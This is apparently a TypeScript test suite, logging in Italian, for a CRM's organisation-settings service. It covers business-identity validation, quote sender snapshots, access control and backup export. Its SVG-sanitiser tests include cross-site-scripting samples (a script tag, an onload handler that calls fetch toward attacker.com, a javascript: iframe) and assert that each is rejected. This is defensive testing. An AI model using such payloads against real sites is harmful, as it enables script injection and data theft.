import {
  db,
  users,
  quotes,
  quoteItems,
  quoteVersions,
  organizationSettings,
  initDatabase,
} from '@ai-crm/db';
import { eq } from 'drizzle-orm';
import {
  getOrganizationSettings,
  updateOrganizationSettings,
  validateBusinessIdentity,
  sanitizeSvgBuffer,
  buildQuoteSenderSnapshot,
  exportSettingsBackup,
} from '../apps/web/src/lib/settings-service';
import {
  createQuote,
  markSentToClient,
  recordClientAcceptance,
  snapshotQuoteVersion,
} from '../apps/web/src/lib/quotes-service';
import { requireAuth } from '../apps/web/src/lib/auth';

function assert(condition: boolean, msg: string) {
  if (!condition) {
    console.error(`❌ ASSERTION FAILED: ${msg}`);
    throw new Error(`Assertion failed: ${msg}`);
  }
  console.log(`  ✓ ${msg}`);
}

async function runSettingsTestSuite() {
  console.log('===============================================================');
  console.log('🚀 SUITE DI TEST: AREA ADMIN → IMPOSTAZIONI & IDENTITÀ BRAND');
  console.log('===============================================================');

  initDatabase();
  const now = new Date().toISOString();
  const testId = `test_${Date.now()}`;

  // Test setup: Admin and Operator users
  const adminId = `usr_adm_${testId}`;
  const operatorId = `usr_op_${testId}`;

  db.insert(users).values([
    {
      id: adminId,
      name: 'Admin Test Settings',
      email: `admin_${testId}@test.local`,
      passwordHash: 'dummy_hash',
      role: 'admin',
      status: 'active',
      createdAt: now,
      updatedAt: now,
    },
    {
      id: operatorId,
      name: 'Operator Test Settings',
      email: `operator_${testId}@test.local`,
      passwordHash: 'dummy_hash',
      role: 'operator',
      status: 'active',
      createdAt: now,
      updatedAt: now,
    },
  ]).run();

  const adminUser = {
    userId: adminId,
    role: 'admin' as const,
    name: 'Admin Test Settings',
    email: `admin_${testId}@test.local`,
  };

  const operatorUser = {
    userId: operatorId,
    role: 'operator' as const,
    name: 'Operator Test Settings',
    email: `operator_${testId}@test.local`,
  };

  // 1. Database Schema & Initial Defaults
  console.log('\n--- 1. Verifica Schema & Default Iniziali ---');
  const initialSettings = getOrganizationSettings();
  assert(!!initialSettings, 'getOrganizationSettings() restituisce un record');
  assert(initialSettings.id === 'default', 'Settings default ID è "default"');
  assert(initialSettings.brandKey === 'default', 'brandKey è "default"');
  assert(typeof initialSettings.brandName === 'string', 'brandName è presente');
  assert(typeof initialSettings.quoteDefaultValidityDays === 'number', 'quoteDefaultValidityDays è configurato numericamente');

  // 2. Validazione Dati Fiscali e Identità Aziendale
  console.log('\n--- 2. Validazione Dati Fiscali e Identità Aziendale ---');
  // Partita IVA italiana
  const validVatIT = validateBusinessIdentity({ vatId: 'IT09876543210' });
  assert(validVatIT.valid, 'Partita IVA italiana IT09876543210 valida');

  const validVatNumeric = validateBusinessIdentity({ vatId: '09876543210' });
  assert(validVatNumeric.valid, 'Partita IVA italiana 11 cifre numeriche valida');

  const invalidVat = validateBusinessIdentity({ vatId: '12345' });
  assert(!invalidVat.valid && !!invalidVat.errors.vatId, 'Partita IVA corta "12345" rilevata non valida');

  // Partita IVA comunitaria EU
  const validVatDE = validateBusinessIdentity({ vatId: 'DE123456789' });
  assert(validVatDE.valid, 'Partita IVA comunitaria DE123456789 valida');

  // Codice Fiscale
  const validCfPerson = validateBusinessIdentity({ fiscalCode: 'RSSMRA80A01H501U' });
  assert(validCfPerson.valid, 'Codice Fiscale persona fisica 16 caratteri valido');

  const validCfCompany = validateBusinessIdentity({ fiscalCode: '09876543210' });
  assert(validCfCompany.valid, 'Codice Fiscale persona giuridica 11 cifre valido');

  const invalidCf = validateBusinessIdentity({ fiscalCode: 'INVALID_CF_123' });
  assert(!invalidCf.valid && !!invalidCf.errors.fiscalCode, 'Codice Fiscale "INVALID_CF_123" rilevato non valido');

  // PEC & Email
  const validPec = validateBusinessIdentity({ pec: 'amministrazione@pec.agenzia.it' });
  assert(validPec.valid, 'PEC formattata correttamente valida');

  const invalidPec = validateBusinessIdentity({ pec: 'pec-senza-chiocciola' });
  assert(!invalidPec.valid && !!invalidPec.errors.pec, 'PEC non valida "pec-senza-chiocciola" rilevata');

  // Codice SDI
  const validSdi = validateBusinessIdentity({ sdiCode: 'M5UXCR1' });
  assert(validSdi.valid, 'Codice SDI 7 caratteri "M5UXCR1" valido');

  const validSdiZero = validateBusinessIdentity({ sdiCode: '0000000' });
  assert(validSdiZero.valid, 'Codice SDI "0000000" valido');

  const invalidSdi = validateBusinessIdentity({ sdiCode: 'SHORT' });
  assert(!invalidSdi.valid && !!invalidSdi.errors.sdiCode, 'Codice SDI "SHORT" rilevato non valido');

  // CAP & Colori
  const validCap = validateBusinessIdentity({ postalCode: '20121' });
  assert(validCap.valid, 'CAP 5 cifre "20121" valido');

  const invalidCap = validateBusinessIdentity({ postalCode: '201' });
  assert(!invalidCap.valid && !!invalidCap.errors.postalCode, 'CAP "201" rilevato non valido');

  const validColor = validateBusinessIdentity({ primaryColor: '#2563eb' });
  assert(validColor.valid, 'Colore HEX "#2563eb" valido');

  const invalidColor = validateBusinessIdentity({ primaryColor: 'rgb(255,0,0)' });
  assert(!invalidColor.valid && !!invalidColor.errors.primaryColor, 'Colore "rgb(255,0,0)" rilevato non valido (richiesto HEX)');

  // 3. Sanitizzazione e Sicurezza SVG
  console.log('\n--- 3. Sanitizzazione e Sicurezza Upload SVG ---');
  const safeSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="#2563eb" /></svg>`;
  const cleanRes = sanitizeSvgBuffer(Buffer.from(safeSvg, 'utf-8'));
  assert(cleanRes.isSafe, 'SVG legittimo e pulito accettato');

  const maliciousScriptSvg = `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><circle cx="50" cy="50" r="40"/></svg>`;
  const scriptRes = sanitizeSvgBuffer(Buffer.from(maliciousScriptSvg, 'utf-8'));
  assert(!scriptRes.isSafe, 'SVG contenente <script> bloccato e rifiutato con errore');

  const maliciousOnloadSvg = `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com')"><rect width="10" height="10"/></svg>`;
  const onloadRes = sanitizeSvgBuffer(Buffer.from(maliciousOnloadSvg, 'utf-8'));
  assert(!onloadRes.isSafe, 'SVG contenente onload handler bloccato e rifiutato');

  const maliciousIframeSvg = `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>`;
  const iframeRes = sanitizeSvgBuffer(Buffer.from(maliciousIframeSvg, 'utf-8'));
  assert(!iframeRes.isSafe, 'SVG contenente <foreignObject> o <iframe> bloccato e rifiutato');

  // 4. Aggiornamento Impostazioni Centralizzate & Controllo Accessi Ruolo
  console.log('\n--- 4. Aggiornamento Impostazioni Centralizzate & RBAC ---');
  let operatorBlocked = false;
  try {
    await updateOrganizationSettings({ legalName: 'Hacked Name' }, operatorUser);
  } catch (err: any) {
    operatorBlocked = err.message === 'FORBIDDEN';
  }
  assert(operatorBlocked, 'Tentativo di modifica impostazioni da parte di un operatore bloccato con FORBIDDEN');

  const updatedSettings = await updateOrganizationSettings(
    {
      legalName: 'AI Agency Italia S.r.l.',
      legalForm: 'S.r.l.',
      vatId: 'IT01234567890',
      fiscalCode: '01234567890',
      legalAddress: 'Via Montenapoleone 14',
      postalCode: '20121',
      city: 'Milano',
      province: 'MI',
      country: 'IT',
      adminEmail: 'direzione@ai-agency.it',
      phone: '+39 02 87654321',
      pec: 'amministrazione@pec.ai-agency.it',
      sdiCode: 'M5UXCR1',
      brandName: 'AI Innovation Suite',
      tagline: 'Intelligenza Artificiale & Automazione di Processo',
      quoteHeaderNotes: 'Offerta personalizzata ad alto valore tecnologico',
      quoteDefaultValidityDays: 45,
      quoteDefaultTerms: '40% acconto, 30% beta, 30% saldo',
      quotePaymentInstructions: 'Bonifico Bancario IBAN: IT60X0542811101000000123456',
      quoteFooterText: 'Offerta vincolante per 45 giorni. Foro competente: Milano.',
      quoteLogoChoice: 'primary',
    },
    adminUser
  );

  assert(updatedSettings.legalName === 'AI Agency Italia S.r.l.', 'legalName aggiornato con successo');
  assert(updatedSettings.brandName === 'AI Innovation Suite', 'brandName aggiornato con successo');
  assert(updatedSettings.vatId === 'IT01234567890', 'vatId aggiornato con successo');
  assert(updatedSettings.quoteDefaultValidityDays === 45, 'quoteDefaultValidityDays aggiornato a 45');

  // 5. Creazione Preventivo & Snapshot Mittente (Quote Immutability)
  console.log('\n--- 5. Creazione Preventivo & Snapshot Mittente ---');
  const quoteRes1 = await createQuote(
    {
      title: 'Progetto Automazione AI Aziendale',
      currency: 'EUR',
      items: [
        {
          description: 'Fase 1: Analisi e Setup Pipeline AI',
          quantity: 1,
          unitPrice: 500000, // 5000.00 EUR
          discountPercent: 0,
        },
      ],
    },
    adminUser
  );

  const quote1 = quoteRes1.quote;
  assert(!!quote1.id, 'Preventivo 1 creato');
  assert(quote1.validUntil !== null, 'Data validità preventivo calcolata automaticamente');

  // Check that current version has senderSnapshotJson
  const ver1 = db.select().from(quoteVersions).where(eq(quoteVersions.quoteId, quote1.id)).get();
  assert(!!ver1, 'Versione 1 del preventivo esiste');
  assert(!!ver1?.senderSnapshotJson, 'senderSnapshotJson registrato nella versione 1');

  const snapshot1 = JSON.parse(ver1!.senderSnapshotJson!);
  assert(snapshot1.brandName === 'AI Innovation Suite', 'Snapshot 1 contiene brandName corretto');
  assert(snapshot1.legalName === 'AI Agency Italia S.r.l.', 'Snapshot 1 contiene legalName corretto');
  assert(snapshot1.vatId === 'IT01234567890', 'Snapshot 1 contiene vatId corretto');

  // 6. Invio e Accettazione Preventivo + Modifica Impostazioni Successiva
  console.log('\n--- 6. Immutabilità: Modifica Impostazioni dopo Invio/Accettazione ---');
  // Mark sent to client
  await markSentToClient(quote1.id, adminUser);

  // Record acceptance
  await recordClientAcceptance(
    quote1.id,
    {
      decidedBy: 'Mario Rossi (CEO)',
      decidedAt: new Date().toISOString().slice(0, 10),
      method: 'signed_contract',
      evidenceNotes: 'Contratto controfirmato e ricevuto via PEC',
    },
    adminUser
  );

  // Now, modify central settings (e.g., brand name changes to 'AI Global Group', new legal name, new VAT)
  await updateOrganizationSettings(
    {
      brandName: 'AI Global Group',
      legalName: 'AI Global Group S.p.A.',
      vatId: 'IT99999999999',
      quoteHeaderNotes: 'Nuovo payoff e nuove note',
    },
    adminUser
  );

  // Verify that quote1 version still retains old frozen snapshot
  const frozenVersion = db.select().from(quoteVersions).where(eq(quoteVersions.quoteId, quote1.id)).get();
  const frozenSnapshot = JSON.parse(frozenVersion!.senderSnapshotJson!);

  assert(frozenSnapshot.brandName === 'AI Innovation Suite', 'Preventivo inviato/accettato conserva il brandName congelato ("AI Innovation Suite")');
  assert(frozenSnapshot.legalName === 'AI Agency Italia S.r.l.', 'Preventivo inviato/accettato conserva la ragione sociale congelata ("AI Agency Italia S.r.l.")');
  assert(frozenSnapshot.vatId === 'IT01234567890', 'Preventivo inviato/accettato conserva la P.IVA congelata ("IT01234567890")');

  // Verify that a newly created quote receives the new updated settings
  const quoteRes2 = await createQuote(
    {
      title: 'Nuovo Preventivo dopo rebranding',
      currency: 'EUR',
      items: [
        {
          description: 'Consulenza Strategica',
          quantity: 1,
          unitPrice: 200000,
        },
      ],
    },
    adminUser
  );

  const quote2 = quoteRes2.quote;
  const ver2 = db.select().from(quoteVersions).where(eq(quoteVersions.quoteId, quote2.id)).get();
  const snapshot2 = JSON.parse(ver2!.senderSnapshotJson!);

  assert(snapshot2.brandName === 'AI Global Group', 'Nuovo preventivo riceve il nuovo brandName ("AI Global Group")');
  assert(snapshot2.legalName === 'AI Global Group S.p.A.', 'Nuovo preventivo riceve la nuova ragione sociale ("AI Global Group S.p.A.")');
  assert(snapshot2.vatId === 'IT99999999999', 'Nuovo preventivo riceve la nuova P.IVA ("IT99999999999")');

  // 7. Fallback per Preventivi Legacy (senza snapshot)
  console.log('\n--- 7. Fallback Trasparente per Preventivi Legacy ---');
  const legacySnapshot = buildQuoteSenderSnapshot();
  assert(legacySnapshot.brandName === 'AI Global Group', 'buildQuoteSenderSnapshot() genera fallback dinamico valido');
  assert(legacySnapshot.primaryColor.startsWith('#'), 'buildQuoteSenderSnapshot() fornisce palette colori integra');

  // 8. Esportazione Backup JSON
  console.log('\n--- 8. Esportazione Backup JSON ---');
  const backup = exportSettingsBackup();
  assert(!!backup.exportedAt, 'Backup contiene timestamp exportedAt');
  assert(backup.version === '1.0', 'Backup versione 1.0');
  assert(backup.settings.brandName === 'AI Global Group', 'Backup contiene i dati correnti');

  console.log('\n===============================================================');
  console.log('✅ TUTTI I TEST SU IMPOSTAZIONI & IDENTITÀ BRAND SUPERATI!');
  console.log('===============================================================');
}

runSettingsTestSuite().catch((err) => {
  console.error('\n❌ ERRORE DURANTE L\'ESECUZIONE DEI TEST:', err);
  process.exit(1);
});
